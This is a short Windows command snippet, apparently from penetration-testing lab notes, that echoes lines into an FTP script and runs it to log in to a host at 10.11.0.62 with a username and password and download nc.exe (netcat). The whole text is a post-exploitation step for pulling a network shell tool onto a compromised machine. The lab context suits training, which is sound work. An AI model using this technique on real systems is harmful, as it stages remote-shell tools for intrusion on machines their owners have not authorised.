echo open 10.11.0.62 21> ftp.txt
echo USER offsec>> ftp.txt
echo deep_ping >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
